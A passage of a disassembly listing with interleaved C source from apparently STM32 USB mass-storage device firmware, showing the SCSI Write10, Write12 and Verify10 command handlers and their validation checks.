 800a72e:	7f59      	ldrb	r1, [r3, #29]
 800a730:	2320      	movs	r3, #32
 800a732:	2205      	movs	r2, #5
 800a734:	68f8      	ldr	r0, [r7, #12]
 800a736:	f7ff fd75 	bl	800a224 <SCSI_SenseCode>
      return -1;
 800a73a:	f04f 33ff 	mov.w	r3, #4294967295
 800a73e:	e0b0      	b.n	800a8a2 <SCSI_Write10+0x1ba>
    }

    /* case 8 : Hi <> Do */
    if ((hmsc->cbw.bmFlags & 0x80U) == 0x80U)
 800a740:	697b      	ldr	r3, [r7, #20]
 800a742:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a746:	7f1b      	ldrb	r3, [r3, #28]
 800a748:	b25b      	sxtb	r3, r3
 800a74a:	2b00      	cmp	r3, #0
 800a74c:	da0b      	bge.n	800a766 <SCSI_Write10+0x7e>
    {
      SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST, INVALID_CDB);
 800a74e:	697b      	ldr	r3, [r7, #20]
 800a750:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a754:	7f59      	ldrb	r1, [r3, #29]
 800a756:	2320      	movs	r3, #32
 800a758:	2205      	movs	r2, #5
 800a75a:	68f8      	ldr	r0, [r7, #12]
 800a75c:	f7ff fd62 	bl	800a224 <SCSI_SenseCode>
      return -1;
 800a760:	f04f 33ff 	mov.w	r3, #4294967295
 800a764:	e09d      	b.n	800a8a2 <SCSI_Write10+0x1ba>
    }

    /* Check whether Media is ready */
    if (((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->IsReady(lun) != 0)
 800a766:	68fb      	ldr	r3, [r7, #12]
 800a768:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 800a76c:	68fa      	ldr	r2, [r7, #12]
 800a76e:	33b0      	adds	r3, #176	; 0xb0
 800a770:	009b      	lsls	r3, r3, #2
 800a772:	4413      	add	r3, r2
 800a774:	685b      	ldr	r3, [r3, #4]
 800a776:	689b      	ldr	r3, [r3, #8]
 800a778:	7afa      	ldrb	r2, [r7, #11]
 800a77a:	4610      	mov	r0, r2
 800a77c:	4798      	blx	r3
 800a77e:	4603      	mov	r3, r0
 800a780:	2b00      	cmp	r3, #0
 800a782:	d008      	beq.n	800a796 <SCSI_Write10+0xae>
    {
      SCSI_SenseCode(pdev, lun, NOT_READY, MEDIUM_NOT_PRESENT);
 800a784:	7af9      	ldrb	r1, [r7, #11]
 800a786:	233a      	movs	r3, #58	; 0x3a
 800a788:	2202      	movs	r2, #2
 800a78a:	68f8      	ldr	r0, [r7, #12]
 800a78c:	f7ff fd4a 	bl	800a224 <SCSI_SenseCode>
      return -1;
 800a790:	f04f 33ff 	mov.w	r3, #4294967295
 800a794:	e085      	b.n	800a8a2 <SCSI_Write10+0x1ba>
    }

    /* Check If media is write-protected */
    if (((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->IsWriteProtected(lun) != 0)
 800a796:	68fb      	ldr	r3, [r7, #12]
 800a798:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 800a79c:	68fa      	ldr	r2, [r7, #12]
 800a79e:	33b0      	adds	r3, #176	; 0xb0
 800a7a0:	009b      	lsls	r3, r3, #2
 800a7a2:	4413      	add	r3, r2
 800a7a4:	685b      	ldr	r3, [r3, #4]
 800a7a6:	68db      	ldr	r3, [r3, #12]
 800a7a8:	7afa      	ldrb	r2, [r7, #11]
 800a7aa:	4610      	mov	r0, r2
 800a7ac:	4798      	blx	r3
 800a7ae:	4603      	mov	r3, r0
 800a7b0:	2b00      	cmp	r3, #0
 800a7b2:	d008      	beq.n	800a7c6 <SCSI_Write10+0xde>
    {
      SCSI_SenseCode(pdev, lun, NOT_READY, WRITE_PROTECTED);
 800a7b4:	7af9      	ldrb	r1, [r7, #11]
 800a7b6:	2327      	movs	r3, #39	; 0x27
 800a7b8:	2202      	movs	r2, #2
 800a7ba:	68f8      	ldr	r0, [r7, #12]
 800a7bc:	f7ff fd32 	bl	800a224 <SCSI_SenseCode>
      return -1;
 800a7c0:	f04f 33ff 	mov.w	r3, #4294967295
 800a7c4:	e06d      	b.n	800a8a2 <SCSI_Write10+0x1ba>
    }

    hmsc->scsi_blk_addr = ((uint32_t)params[2] << 24) |
 800a7c6:	687b      	ldr	r3, [r7, #4]
 800a7c8:	3302      	adds	r3, #2
 800a7ca:	781b      	ldrb	r3, [r3, #0]
 800a7cc:	061a      	lsls	r2, r3, #24
                          ((uint32_t)params[3] << 16) |
 800a7ce:	687b      	ldr	r3, [r7, #4]
 800a7d0:	3303      	adds	r3, #3
 800a7d2:	781b      	ldrb	r3, [r3, #0]
 800a7d4:	041b      	lsls	r3, r3, #16
    hmsc->scsi_blk_addr = ((uint32_t)params[2] << 24) |
 800a7d6:	431a      	orrs	r2, r3
                          ((uint32_t)params[4] << 8) |
 800a7d8:	687b      	ldr	r3, [r7, #4]
 800a7da:	3304      	adds	r3, #4
 800a7dc:	781b      	ldrb	r3, [r3, #0]
 800a7de:	021b      	lsls	r3, r3, #8
                          ((uint32_t)params[3] << 16) |
 800a7e0:	4313      	orrs	r3, r2
                          (uint32_t)params[5];
 800a7e2:	687a      	ldr	r2, [r7, #4]
 800a7e4:	3205      	adds	r2, #5
 800a7e6:	7812      	ldrb	r2, [r2, #0]
                          ((uint32_t)params[4] << 8) |
 800a7e8:	4313      	orrs	r3, r2
    hmsc->scsi_blk_addr = ((uint32_t)params[2] << 24) |
 800a7ea:	697a      	ldr	r2, [r7, #20]
 800a7ec:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800a7f0:	66d3      	str	r3, [r2, #108]	; 0x6c

    hmsc->scsi_blk_len = ((uint32_t)params[7] << 8) |
 800a7f2:	687b      	ldr	r3, [r7, #4]
 800a7f4:	3307      	adds	r3, #7
 800a7f6:	781b      	ldrb	r3, [r3, #0]
 800a7f8:	021b      	lsls	r3, r3, #8
                         (uint32_t)params[8];
 800a7fa:	687a      	ldr	r2, [r7, #4]
 800a7fc:	3208      	adds	r2, #8
 800a7fe:	7812      	ldrb	r2, [r2, #0]
    hmsc->scsi_blk_len = ((uint32_t)params[7] << 8) |
 800a800:	4313      	orrs	r3, r2
 800a802:	697a      	ldr	r2, [r7, #20]
 800a804:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800a808:	6713      	str	r3, [r2, #112]	; 0x70

    /* check if LBA address is in the right range */
    if (SCSI_CheckAddressRange(pdev, lun, hmsc->scsi_blk_addr,
 800a80a:	697b      	ldr	r3, [r7, #20]
 800a80c:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a810:	6eda      	ldr	r2, [r3, #108]	; 0x6c
 800a812:	697b      	ldr	r3, [r7, #20]
 800a814:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a818:	6f1b      	ldr	r3, [r3, #112]	; 0x70
 800a81a:	7af9      	ldrb	r1, [r7, #11]
 800a81c:	68f8      	ldr	r0, [r7, #12]
 800a81e:	f000 f97a 	bl	800ab16 <SCSI_CheckAddressRange>
 800a822:	4603      	mov	r3, r0
 800a824:	2b00      	cmp	r3, #0
 800a826:	da02      	bge.n	800a82e <SCSI_Write10+0x146>
                               hmsc->scsi_blk_len) < 0)
    {
      return -1; /* error */
 800a828:	f04f 33ff 	mov.w	r3, #4294967295
 800a82c:	e039      	b.n	800a8a2 <SCSI_Write10+0x1ba>
    }

    len = hmsc->scsi_blk_len * hmsc->scsi_blk_size;
 800a82e:	697b      	ldr	r3, [r7, #20]
 800a830:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a834:	6f1b      	ldr	r3, [r3, #112]	; 0x70
 800a836:	697a      	ldr	r2, [r7, #20]
 800a838:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800a83c:	f8b2 2064 	ldrh.w	r2, [r2, #100]	; 0x64
 800a840:	fb02 f303 	mul.w	r3, r2, r3
 800a844:	613b      	str	r3, [r7, #16]

    /* cases 3,11,13 : Hn,Ho <> D0 */
    if (hmsc->cbw.dDataLength != len)
 800a846:	697b      	ldr	r3, [r7, #20]
 800a848:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a84c:	699b      	ldr	r3, [r3, #24]
 800a84e:	693a      	ldr	r2, [r7, #16]
 800a850:	429a      	cmp	r2, r3
 800a852:	d00b      	beq.n	800a86c <SCSI_Write10+0x184>
    {
      SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST, INVALID_CDB);
 800a854:	697b      	ldr	r3, [r7, #20]
 800a856:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a85a:	7f59      	ldrb	r1, [r3, #29]
 800a85c:	2320      	movs	r3, #32
 800a85e:	2205      	movs	r2, #5
 800a860:	68f8      	ldr	r0, [r7, #12]
 800a862:	f7ff fcdf 	bl	800a224 <SCSI_SenseCode>
      return -1;
 800a866:	f04f 33ff 	mov.w	r3, #4294967295
 800a86a:	e01a      	b.n	800a8a2 <SCSI_Write10+0x1ba>
    }

    len = MIN(len, MSC_MEDIA_PACKET);
 800a86c:	693b      	ldr	r3, [r7, #16]
 800a86e:	f5b3 5f80 	cmp.w	r3, #4096	; 0x1000
 800a872:	bf28      	it	cs
 800a874:	f44f 5380 	movcs.w	r3, #4096	; 0x1000
 800a878:	613b      	str	r3, [r7, #16]

    /* Prepare EP to receive first data packet */
    hmsc->bot_state = USBD_BOT_DATA_OUT;
 800a87a:	697b      	ldr	r3, [r7, #20]
 800a87c:	2201      	movs	r2, #1
 800a87e:	721a      	strb	r2, [r3, #8]
    (void)USBD_LL_PrepareReceive(pdev, MSCOutEpAdd, hmsc->bot_data, len);
 800a880:	4b0a      	ldr	r3, [pc, #40]	; (800a8ac <SCSI_Write10+0x1c4>)
 800a882:	7819      	ldrb	r1, [r3, #0]
 800a884:	697b      	ldr	r3, [r7, #20]
 800a886:	f103 0210 	add.w	r2, r3, #16
 800a88a:	693b      	ldr	r3, [r7, #16]
 800a88c:	68f8      	ldr	r0, [r7, #12]
 800a88e:	f002 faf3 	bl	800ce78 <USBD_LL_PrepareReceive>
  else /* Write Process ongoing */
  {
    return SCSI_ProcessWrite(pdev, lun);
  }

  return 0;
 800a892:	2300      	movs	r3, #0
 800a894:	e005      	b.n	800a8a2 <SCSI_Write10+0x1ba>
    return SCSI_ProcessWrite(pdev, lun);
 800a896:	7afb      	ldrb	r3, [r7, #11]
 800a898:	4619      	mov	r1, r3
 800a89a:	68f8      	ldr	r0, [r7, #12]
 800a89c:	f000 f9fe 	bl	800ac9c <SCSI_ProcessWrite>
 800a8a0:	4603      	mov	r3, r0
}
 800a8a2:	4618      	mov	r0, r3
 800a8a4:	3718      	adds	r7, #24
 800a8a6:	46bd      	mov	sp, r7
 800a8a8:	bd80      	pop	{r7, pc}
 800a8aa:	bf00      	nop
 800a8ac:	2000010b 	.word	0x2000010b

0800a8b0 <SCSI_Write12>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_Write12(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 800a8b0:	b580      	push	{r7, lr}
 800a8b2:	b086      	sub	sp, #24
 800a8b4:	af00      	add	r7, sp, #0
 800a8b6:	60f8      	str	r0, [r7, #12]
 800a8b8:	460b      	mov	r3, r1
 800a8ba:	607a      	str	r2, [r7, #4]
 800a8bc:	72fb      	strb	r3, [r7, #11]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800a8be:	68fb      	ldr	r3, [r7, #12]
 800a8c0:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800a8c4:	68fb      	ldr	r3, [r7, #12]
 800a8c6:	32b0      	adds	r2, #176	; 0xb0
 800a8c8:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800a8cc:	617b      	str	r3, [r7, #20]
  uint32_t len;

  if (hmsc == NULL)
 800a8ce:	697b      	ldr	r3, [r7, #20]
 800a8d0:	2b00      	cmp	r3, #0
 800a8d2:	d102      	bne.n	800a8da <SCSI_Write12+0x2a>
  {
    return -1;
 800a8d4:	f04f 33ff 	mov.w	r3, #4294967295
 800a8d8:	e0d7      	b.n	800aa8a <SCSI_Write12+0x1da>
#ifdef USE_USBD_COMPOSITE
  /* Get the Endpoints addresses allocated for this class instance */
  MSCOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  if (hmsc->bot_state == USBD_BOT_IDLE) /* Idle */
 800a8da:	697b      	ldr	r3, [r7, #20]
 800a8dc:	7a1b      	ldrb	r3, [r3, #8]
 800a8de:	2b00      	cmp	r3, #0
 800a8e0:	f040 80cd 	bne.w	800aa7e <SCSI_Write12+0x1ce>
  {
    if (hmsc->cbw.dDataLength == 0U)
 800a8e4:	697b      	ldr	r3, [r7, #20]
 800a8e6:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a8ea:	699b      	ldr	r3, [r3, #24]
 800a8ec:	2b00      	cmp	r3, #0
 800a8ee:	d10b      	bne.n	800a908 <SCSI_Write12+0x58>
    {
      SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST, INVALID_CDB);
 800a8f0:	697b      	ldr	r3, [r7, #20]
 800a8f2:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a8f6:	7f59      	ldrb	r1, [r3, #29]
 800a8f8:	2320      	movs	r3, #32
 800a8fa:	2205      	movs	r2, #5
 800a8fc:	68f8      	ldr	r0, [r7, #12]
 800a8fe:	f7ff fc91 	bl	800a224 <SCSI_SenseCode>
      return -1;
 800a902:	f04f 33ff 	mov.w	r3, #4294967295
 800a906:	e0c0      	b.n	800aa8a <SCSI_Write12+0x1da>
    }

    /* case 8 : Hi <> Do */
    if ((hmsc->cbw.bmFlags & 0x80U) == 0x80U)
 800a908:	697b      	ldr	r3, [r7, #20]
 800a90a:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a90e:	7f1b      	ldrb	r3, [r3, #28]
 800a910:	b25b      	sxtb	r3, r3
 800a912:	2b00      	cmp	r3, #0
 800a914:	da0b      	bge.n	800a92e <SCSI_Write12+0x7e>
    {
      SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST, INVALID_CDB);
 800a916:	697b      	ldr	r3, [r7, #20]
 800a918:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a91c:	7f59      	ldrb	r1, [r3, #29]
 800a91e:	2320      	movs	r3, #32
 800a920:	2205      	movs	r2, #5
 800a922:	68f8      	ldr	r0, [r7, #12]
 800a924:	f7ff fc7e 	bl	800a224 <SCSI_SenseCode>
      return -1;
 800a928:	f04f 33ff 	mov.w	r3, #4294967295
 800a92c:	e0ad      	b.n	800aa8a <SCSI_Write12+0x1da>
    }

    /* Check whether Media is ready */
    if (((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->IsReady(lun) != 0)
 800a92e:	68fb      	ldr	r3, [r7, #12]
 800a930:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 800a934:	68fa      	ldr	r2, [r7, #12]
 800a936:	33b0      	adds	r3, #176	; 0xb0
 800a938:	009b      	lsls	r3, r3, #2
 800a93a:	4413      	add	r3, r2
 800a93c:	685b      	ldr	r3, [r3, #4]
 800a93e:	689b      	ldr	r3, [r3, #8]
 800a940:	7afa      	ldrb	r2, [r7, #11]
 800a942:	4610      	mov	r0, r2
 800a944:	4798      	blx	r3
 800a946:	4603      	mov	r3, r0
 800a948:	2b00      	cmp	r3, #0
 800a94a:	d00b      	beq.n	800a964 <SCSI_Write12+0xb4>
    {
      SCSI_SenseCode(pdev, lun, NOT_READY, MEDIUM_NOT_PRESENT);
 800a94c:	7af9      	ldrb	r1, [r7, #11]
 800a94e:	233a      	movs	r3, #58	; 0x3a
 800a950:	2202      	movs	r2, #2
 800a952:	68f8      	ldr	r0, [r7, #12]
 800a954:	f7ff fc66 	bl	800a224 <SCSI_SenseCode>
      hmsc->bot_state = USBD_BOT_NO_DATA;
 800a958:	697b      	ldr	r3, [r7, #20]
 800a95a:	2205      	movs	r2, #5
 800a95c:	721a      	strb	r2, [r3, #8]
      return -1;
 800a95e:	f04f 33ff 	mov.w	r3, #4294967295
 800a962:	e092      	b.n	800aa8a <SCSI_Write12+0x1da>
    }

    /* Check If media is write-protected */
    if (((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->IsWriteProtected(lun) != 0)
 800a964:	68fb      	ldr	r3, [r7, #12]
 800a966:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 800a96a:	68fa      	ldr	r2, [r7, #12]
 800a96c:	33b0      	adds	r3, #176	; 0xb0
 800a96e:	009b      	lsls	r3, r3, #2
 800a970:	4413      	add	r3, r2
 800a972:	685b      	ldr	r3, [r3, #4]
 800a974:	68db      	ldr	r3, [r3, #12]
 800a976:	7afa      	ldrb	r2, [r7, #11]
 800a978:	4610      	mov	r0, r2
 800a97a:	4798      	blx	r3
 800a97c:	4603      	mov	r3, r0
 800a97e:	2b00      	cmp	r3, #0
 800a980:	d00b      	beq.n	800a99a <SCSI_Write12+0xea>
    {
      SCSI_SenseCode(pdev, lun, NOT_READY, WRITE_PROTECTED);
 800a982:	7af9      	ldrb	r1, [r7, #11]
 800a984:	2327      	movs	r3, #39	; 0x27
 800a986:	2202      	movs	r2, #2
 800a988:	68f8      	ldr	r0, [r7, #12]
 800a98a:	f7ff fc4b 	bl	800a224 <SCSI_SenseCode>
      hmsc->bot_state = USBD_BOT_NO_DATA;
 800a98e:	697b      	ldr	r3, [r7, #20]
 800a990:	2205      	movs	r2, #5
 800a992:	721a      	strb	r2, [r3, #8]
      return -1;
 800a994:	f04f 33ff 	mov.w	r3, #4294967295
 800a998:	e077      	b.n	800aa8a <SCSI_Write12+0x1da>
    }

    hmsc->scsi_blk_addr = ((uint32_t)params[2] << 24) |
 800a99a:	687b      	ldr	r3, [r7, #4]
 800a99c:	3302      	adds	r3, #2
 800a99e:	781b      	ldrb	r3, [r3, #0]
 800a9a0:	061a      	lsls	r2, r3, #24
                          ((uint32_t)params[3] << 16) |
 800a9a2:	687b      	ldr	r3, [r7, #4]
 800a9a4:	3303      	adds	r3, #3
 800a9a6:	781b      	ldrb	r3, [r3, #0]
 800a9a8:	041b      	lsls	r3, r3, #16
    hmsc->scsi_blk_addr = ((uint32_t)params[2] << 24) |
 800a9aa:	431a      	orrs	r2, r3
                          ((uint32_t)params[4] << 8) |
 800a9ac:	687b      	ldr	r3, [r7, #4]
 800a9ae:	3304      	adds	r3, #4
 800a9b0:	781b      	ldrb	r3, [r3, #0]
 800a9b2:	021b      	lsls	r3, r3, #8
                          ((uint32_t)params[3] << 16) |
 800a9b4:	4313      	orrs	r3, r2
                          (uint32_t)params[5];
 800a9b6:	687a      	ldr	r2, [r7, #4]
 800a9b8:	3205      	adds	r2, #5
 800a9ba:	7812      	ldrb	r2, [r2, #0]
                          ((uint32_t)params[4] << 8) |
 800a9bc:	4313      	orrs	r3, r2
    hmsc->scsi_blk_addr = ((uint32_t)params[2] << 24) |
 800a9be:	697a      	ldr	r2, [r7, #20]
 800a9c0:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800a9c4:	66d3      	str	r3, [r2, #108]	; 0x6c

    hmsc->scsi_blk_len = ((uint32_t)params[6] << 24) |
 800a9c6:	687b      	ldr	r3, [r7, #4]
 800a9c8:	3306      	adds	r3, #6
 800a9ca:	781b      	ldrb	r3, [r3, #0]
 800a9cc:	061a      	lsls	r2, r3, #24
                         ((uint32_t)params[7] << 16) |
 800a9ce:	687b      	ldr	r3, [r7, #4]
 800a9d0:	3307      	adds	r3, #7
 800a9d2:	781b      	ldrb	r3, [r3, #0]
 800a9d4:	041b      	lsls	r3, r3, #16
    hmsc->scsi_blk_len = ((uint32_t)params[6] << 24) |
 800a9d6:	431a      	orrs	r2, r3
                         ((uint32_t)params[8] << 8) |
 800a9d8:	687b      	ldr	r3, [r7, #4]
 800a9da:	3308      	adds	r3, #8
 800a9dc:	781b      	ldrb	r3, [r3, #0]
 800a9de:	021b      	lsls	r3, r3, #8
                         ((uint32_t)params[7] << 16) |
 800a9e0:	4313      	orrs	r3, r2
                         (uint32_t)params[9];
 800a9e2:	687a      	ldr	r2, [r7, #4]
 800a9e4:	3209      	adds	r2, #9
 800a9e6:	7812      	ldrb	r2, [r2, #0]
                         ((uint32_t)params[8] << 8) |
 800a9e8:	4313      	orrs	r3, r2
    hmsc->scsi_blk_len = ((uint32_t)params[6] << 24) |
 800a9ea:	697a      	ldr	r2, [r7, #20]
 800a9ec:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800a9f0:	6713      	str	r3, [r2, #112]	; 0x70

    /* check if LBA address is in the right range */
    if (SCSI_CheckAddressRange(pdev, lun, hmsc->scsi_blk_addr,
 800a9f2:	697b      	ldr	r3, [r7, #20]
 800a9f4:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a9f8:	6eda      	ldr	r2, [r3, #108]	; 0x6c
 800a9fa:	697b      	ldr	r3, [r7, #20]
 800a9fc:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800aa00:	6f1b      	ldr	r3, [r3, #112]	; 0x70
 800aa02:	7af9      	ldrb	r1, [r7, #11]
 800aa04:	68f8      	ldr	r0, [r7, #12]
 800aa06:	f000 f886 	bl	800ab16 <SCSI_CheckAddressRange>
 800aa0a:	4603      	mov	r3, r0
 800aa0c:	2b00      	cmp	r3, #0
 800aa0e:	da02      	bge.n	800aa16 <SCSI_Write12+0x166>
                               hmsc->scsi_blk_len) < 0)
    {
      return -1; /* error */
 800aa10:	f04f 33ff 	mov.w	r3, #4294967295
 800aa14:	e039      	b.n	800aa8a <SCSI_Write12+0x1da>
    }

    len = hmsc->scsi_blk_len * hmsc->scsi_blk_size;
 800aa16:	697b      	ldr	r3, [r7, #20]
 800aa18:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800aa1c:	6f1b      	ldr	r3, [r3, #112]	; 0x70
 800aa1e:	697a      	ldr	r2, [r7, #20]
 800aa20:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800aa24:	f8b2 2064 	ldrh.w	r2, [r2, #100]	; 0x64
 800aa28:	fb02 f303 	mul.w	r3, r2, r3
 800aa2c:	613b      	str	r3, [r7, #16]

    /* cases 3,11,13 : Hn,Ho <> D0 */
    if (hmsc->cbw.dDataLength != len)
 800aa2e:	697b      	ldr	r3, [r7, #20]
 800aa30:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800aa34:	699b      	ldr	r3, [r3, #24]
 800aa36:	693a      	ldr	r2, [r7, #16]
 800aa38:	429a      	cmp	r2, r3
 800aa3a:	d00b      	beq.n	800aa54 <SCSI_Write12+0x1a4>
    {
      SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST, INVALID_CDB);
 800aa3c:	697b      	ldr	r3, [r7, #20]
 800aa3e:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800aa42:	7f59      	ldrb	r1, [r3, #29]
 800aa44:	2320      	movs	r3, #32
 800aa46:	2205      	movs	r2, #5
 800aa48:	68f8      	ldr	r0, [r7, #12]
 800aa4a:	f7ff fbeb 	bl	800a224 <SCSI_SenseCode>
      return -1;
 800aa4e:	f04f 33ff 	mov.w	r3, #4294967295
 800aa52:	e01a      	b.n	800aa8a <SCSI_Write12+0x1da>
    }

    len = MIN(len, MSC_MEDIA_PACKET);
 800aa54:	693b      	ldr	r3, [r7, #16]
 800aa56:	f5b3 5f80 	cmp.w	r3, #4096	; 0x1000
 800aa5a:	bf28      	it	cs
 800aa5c:	f44f 5380 	movcs.w	r3, #4096	; 0x1000
 800aa60:	613b      	str	r3, [r7, #16]

    /* Prepare EP to receive first data packet */
    hmsc->bot_state = USBD_BOT_DATA_OUT;
 800aa62:	697b      	ldr	r3, [r7, #20]
 800aa64:	2201      	movs	r2, #1
 800aa66:	721a      	strb	r2, [r3, #8]
    (void)USBD_LL_PrepareReceive(pdev, MSCOutEpAdd, hmsc->bot_data, len);
 800aa68:	4b0a      	ldr	r3, [pc, #40]	; (800aa94 <SCSI_Write12+0x1e4>)
 800aa6a:	7819      	ldrb	r1, [r3, #0]
 800aa6c:	697b      	ldr	r3, [r7, #20]
 800aa6e:	f103 0210 	add.w	r2, r3, #16
 800aa72:	693b      	ldr	r3, [r7, #16]
 800aa74:	68f8      	ldr	r0, [r7, #12]
 800aa76:	f002 f9ff 	bl	800ce78 <USBD_LL_PrepareReceive>
  else /* Write Process ongoing */
  {
    return SCSI_ProcessWrite(pdev, lun);
  }

  return 0;
 800aa7a:	2300      	movs	r3, #0
 800aa7c:	e005      	b.n	800aa8a <SCSI_Write12+0x1da>
    return SCSI_ProcessWrite(pdev, lun);
 800aa7e:	7afb      	ldrb	r3, [r7, #11]
 800aa80:	4619      	mov	r1, r3
 800aa82:	68f8      	ldr	r0, [r7, #12]
 800aa84:	f000 f90a 	bl	800ac9c <SCSI_ProcessWrite>
 800aa88:	4603      	mov	r3, r0
}
 800aa8a:	4618      	mov	r0, r3
 800aa8c:	3718      	adds	r7, #24
 800aa8e:	46bd      	mov	sp, r7
 800aa90:	bd80      	pop	{r7, pc}
 800aa92:	bf00      	nop
 800aa94:	2000010b 	.word	0x2000010b

0800aa98 <SCSI_Verify10>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_Verify10(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 800aa98:	b580      	push	{r7, lr}
 800aa9a:	b086      	sub	sp, #24
 800aa9c:	af00      	add	r7, sp, #0
 800aa9e:	60f8      	str	r0, [r7, #12]
 800aaa0:	460b      	mov	r3, r1
 800aaa2:	607a      	str	r2, [r7, #4]
 800aaa4:	72fb      	strb	r3, [r7, #11]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800aaa6:	68fb      	ldr	r3, [r7, #12]
 800aaa8:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800aaac:	68fb      	ldr	r3, [r7, #12]
 800aaae:	32b0      	adds	r2, #176	; 0xb0
 800aab0:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800aab4:	617b      	str	r3, [r7, #20]

  if (hmsc == NULL)
 800aab6:	697b      	ldr	r3, [r7, #20]
 800aab8:	2b00      	cmp	r3, #0
 800aaba:	d102      	bne.n	800aac2 <SCSI_Verify10+0x2a>
  {
    return -1;
 800aabc:	f04f 33ff 	mov.w	r3, #4294967295
 800aac0:	e025      	b.n	800ab0e <SCSI_Verify10+0x76>
  }

  if ((params[1] & 0x02U) == 0x02U)
 800aac2:	687b      	ldr	r3, [r7, #4]
 800aac4:	3301      	adds	r3, #1
 800aac6:	781b      	ldrb	r3, [r3, #0]
 800aac8:	f003 0302 	and.w	r3, r3, #2
 800aacc:	2b00      	cmp	r3, #0
 800aace:	d008      	beq.n	800aae2 <SCSI_Verify10+0x4a>
  {
    SCSI_SenseCode(pdev, lun, ILLEGAL_REQUEST, INVALID_FIELED_IN_COMMAND);
 800aad0:	7af9      	ldrb	r1, [r7, #11]
 800aad2:	2324      	movs	r3, #36	; 0x24
 800aad4:	2205      	movs	r2, #5
 800aad6:	68f8      	ldr	r0, [r7, #12]
 800aad8:	f7ff fba4 	bl	800a224 <SCSI_SenseCode>
    return -1; /* Error, Verify Mode Not supported*/
 800aadc:	f04f 33ff 	mov.w	r3, #4294967295
 800aae0:	e015      	b.n	800ab0e <SCSI_Verify10+0x76>
  }

  if (SCSI_CheckAddressRange(pdev, lun, hmsc->scsi_blk_addr, hmsc->scsi_blk_len) < 0)
 800aae2:	697b      	ldr	r3, [r7, #20]
 800aae4:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800aae8:	6eda      	ldr	r2, [r3, #108]	; 0x6c
 800aaea:	697b      	ldr	r3, [r7, #20]
 800aaec:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800aaf0:	6f1b      	ldr	r3, [r3, #112]	; 0x70
 800aaf2:	7af9      	ldrb	r1, [r7, #11]
 800aaf4:	68f8      	ldr	r0, [r7, #12]
 800aaf6:	f000 f80e 	bl	800ab16 <SCSI_CheckAddressRange>
 800aafa:	4603      	mov	r3, r0
 800aafc:	2b00      	cmp	r3, #0
 800aafe:	da02      	bge.n	800ab06 <SCSI_Verify10+0x6e>
  {
    return -1; /* error */
 800ab00:	f04f 33ff 	mov.w	r3, #4294967295
 800ab04:	e003      	b.n	800ab0e <SCSI_Verify10+0x76>
  }

  hmsc->bot_data_length = 0U;
 800ab06:	697b      	ldr	r3, [r7, #20]
 800ab08:	2200      	movs	r2, #0
 800ab0a:	60da      	str	r2, [r3, #12]

  return 0;
 800ab0c:	2300      	movs	r3, #0
}
 800ab0e:	4618      	mov	r0, r3
 800ab10:	3718      	adds	r7, #24
 800ab12:	46bd      	mov	sp, r7
 800ab14:	bd80      	pop	{r7, pc}

0800ab16 <SCSI_CheckAddressRange>:
  * @param  blk_nbr: number of block to be processed
  * @retval status
  */
static int8_t SCSI_CheckAddressRange(USBD_HandleTypeDef *pdev, uint8_t lun,
                                     uint32_t blk_offset, uint32_t blk_nbr)
{
 800ab16:	b580      	push	{r7, lr}
 800ab18:	b086      	sub	sp, #24
 800ab1a:	af00      	add	r7, sp, #0
 800ab1c:	60f8      	str	r0, [r7, #12]
 800ab1e:	607a      	str	r2, [r7, #4]
